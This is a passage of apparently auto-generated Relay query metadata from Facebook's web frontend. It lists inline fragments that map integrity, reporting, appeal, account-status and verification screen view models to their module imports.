                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardVerifyYourBankIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometBVWizardWhyIsWebsiteRecommendedIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "BVWizardWhyIsWebsiteRecommendedIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometCPOWizardIntroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "CPOWizardIntroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometCPOWizardOrganizationTypeSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "CPOWizardOrganizationTypeSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometChallengeSMSConfirmIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ChallengeSMSConfirmIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometChallengeSMSEnterCodeIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ChallengeSMSEnterCodeIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometChallengeSelectIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ChallengeSelectIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometChallengeWhatsAppConfirmIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ChallengeWhatsAppConfirmIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometChallengeWhatsAppEnterCodeIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "ChallengeWhatsAppEnterCodeIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CommunityStandardsScreenComet_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "CommentTombstoneCommunityStandardsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "OurDecisionsScreenComet_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "CommentTombstoneOurDecisionsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometEnforcementDetailInfoScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "EnforcementDetailInfoScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometEnforcementDetailRequestReviewScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "EnforcementDetailRequestReviewScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometEnforcementDetailViolationListScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "EnforcementDetailViolationListScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometEnforcementNoticeBatchedScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "EnforcementNoticeBatchedScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometEnforcementNoticeDetailIPBatchedScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "EnforcementNoticeDetailIPBatchedScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometEnforcementNoticeDetailScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "EnforcementNoticeDetailScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometEnforcementNoticeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "EnforcementNoticeViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometEnforcementNoticeScreenV2_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "EnforcementNoticeScreenV2ViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFEVWizardConfirmContactInformationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardConfirmContactInformationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardDisclaimerOutroScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardDisclaimerOutroScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFEVWizardDisclaimerTextSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardDisclaimerTextSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardFECConfirmDetailsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardFECConfirmDetailsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardFECEmailChallengeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardFECEmailChallengeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardFECEnterDetailsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardFECEnterDetailsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardFreeFormMCMCUploadScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardFreeFormMCMCUploadScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFEVWizardFreeFormOrgDetailsInputScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardFreeFormOrgDetailsInputScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardGovFormScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardGovFormScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardHowWeUseYourInfoScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardHowWeUseYourInfoScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardMethodSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardMethodSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFEVWizardPageNameEmailChallengeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardPageNameEmailChallengeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardPageNameFormScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardPageNameFormScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFEVWizardReviewAdLibraryListingScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardReviewAdLibraryListingScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFEVWizardTaxOrgBusinessReviewDetailsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardTaxOrgBusinessReviewDetailsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardTaxOrgBusinessSelectScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardTaxOrgBusinessSelectScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFEVWizardTaxOrgDocumentRequirementsIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardTaxOrgDocumentRequirementsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFEVWizardTaxOrgFormScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardTaxOrgFormScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFEVWizardTaxOrgManualReviewUploadDocumentsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FEVWizardTaxOrgManualReviewUploadDocumentsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXC4GGroupMemberSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXC4GGroupMemberSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXDebugScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXDebugScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXEscalationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXEscalationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXEvidenceTextScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXEvidenceTextScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFRXFriendOrGroupMemberSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXFriendOrGroupMemberSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXFriendSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXFriendSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXGroupRuleSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXGroupRuleSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFRXInAppEscalationConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXInAppEscalationConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXInAppEscalationMainScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXInAppEscalationMainScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXInAppEscalationReportTypeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXInAppEscalationReportTypeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXMessageSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXMessageSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXMessengerBlockActorScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXMessengerBlockActorScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXGroupMemberSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXMessengerGroupMemberSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFRXMessengerIgnoreConversationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXMessengerIgnoreConversationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXMessengerMuteConversationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXMessengerMuteConversationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFRXMessengerProactiveWarningBlockActorScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXMessengerProactiveWarningBlockActorScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXPageSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXPageSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXPolicyEducationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXPolicyEducationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometFRXPolicyEducationSelfRemediationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXPolicyEducationSelfRemediationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXPostReportProcessTimelineScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXPostReportProcessTimelineScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXPostReportSelfRemediationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXPostReportSelfRemediationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXProfileSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXProfileSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXReportConfirmationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXReportConfirmationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXReportSuspensionDecisionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXReportSuspensionDecisionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXReportSuspensionWarningScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXReportSuspensionWarningScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXTagSearchScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXTagSearchScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometFRXTagSelectionScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXTagSelectionScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "GeminiFRXAlreadyReportedToAdminsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "FRXWorkplaceReportToAdminAlreadyReportedScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometGAMEPlatformIXTScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "GAMEPlatformIXTScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAccountStatusAdminedGroupsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusAdminedGroupsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAccountStatusAdminedPagesScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusAdminedPagesScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAccountStatusDemotionDetailScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusDemotionDetailScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAccountStatusDemotionNotificationDetailScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusDemotionNotificationDetailScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAccountStatusEnforcementDetailAdditionalInformationScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusEnforcementDetailAdditionalInformationScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAccountStatusEnforcementDetailScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusEnforcementDetailViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometIntegrityHubListCollectionCardedDialog_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusListScreenViewModelFactory",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAccountStatusRODemotionNotificationDetail_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusRODemotionNotificationDetailScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAccountStatusRestrictionDetailScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusRestrictionDetailScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName:
                      "CometAccountStatusRestrictionHistoryScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusRestrictionHistoryScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometAccountStatusTimelineScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXAccountStatusTimelineScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXMisinfoAppealDoneScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXMisinfoAppealDoneScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXMisinfoAppealInputScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXMisinfoAppealInputScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXMisinfoAppealScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXMisinfoAppealScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXSupportInboxHomeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXSupportInboxHomeScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXSupportInboxItemDetailsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXSupportInboxItemDetailsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXSupportInboxItemsListScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "IXSupportInboxItemsListScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTAppealChallengesScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTAppealChallengesScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTAppealIPContactReporterScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTAppealIPContactReporterScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTAppealIPOptionsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTAppealIPOptionsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTAppealOptionsScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
                type: "XFBIXTAppealOptionsScreenViewModel",
                abstractKey: null,
              },
              {
                kind: "InlineFragment",
                selections: [
                  {
                    args: null,
                    documentName: "CIXFacebookScreensRenderer_screen",
                    fragmentName: "CometIXTAppealOutcomeScreen_data",
                    fragmentPropName: "data",
                    kind: "ModuleImport",
                  },
                ],
